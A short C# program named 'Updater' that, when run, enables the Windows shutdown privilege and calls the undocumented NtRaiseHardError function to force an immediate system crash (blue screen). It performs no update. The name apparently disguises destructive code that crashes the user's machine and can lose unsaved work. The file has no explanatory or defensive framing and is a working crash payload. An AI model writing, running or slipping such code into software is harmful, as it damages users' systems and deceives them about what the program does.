using System;
using System.Runtime.InteropServices;

namespace Updater
{
    internal class Program
    {
        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        static void Main(string[] args)
        {
            var i = 0xC0000022;
            bool t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError((int)i, 0, 0, IntPtr.Zero, 6, out t2);
        }
    }
}